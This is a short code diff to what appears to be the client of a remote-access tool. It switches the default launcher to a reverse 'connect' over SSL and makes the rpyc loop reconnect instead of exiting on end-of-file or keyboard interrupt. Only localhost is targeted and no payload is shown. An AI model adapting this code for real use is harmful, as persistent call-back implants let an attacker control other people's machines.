@@ -46,10 +46,10 @@ try:
 	import additional_imports #additional imports needed to package with pyinstaller
 except ImportError:
 	pass
-logging.getLogger().setLevel(logging.INFO)
+logging.getLogger().setLevel(logging.DEBUG)
 
-LAUNCHER="simple" # the default launcher to start when no argv
-LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport tcp_ssl") # default launcher arguments
+LAUNCHER="connect" # the default launcher to start when no argv
+LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport ssl") # default launcher arguments
 
 REVERSE_SLAVE_CONF=dict(
 			allow_all_attrs = True,
@@ -211,6 +211,7 @@ def rpyc_loop(launcher):
 					while True:
 						attempt=0
 						conn.serve()
+						#time.sleep(0.001)
 			except KeyboardInterrupt:
 				raise
 			except EOFError:
@@ -221,14 +222,9 @@ def rpyc_loop(launcher):
 				logging.error(e)
 				
 	except EOFError:
-		print "EOF received. exiting."
-		raise
+		print "EOFError received, restarting the connection"
 	except KeyboardInterrupt:
-		if not getattr(sys, 'frozen', False):
-			print ""
-			raise
-		else:
-			print "keyboard interrupt raised, restarting the connection"
+		print "keyboard interrupt raised, restarting the connection"
 	except SystemExit as e:
 		logging.error(e)
 		raise
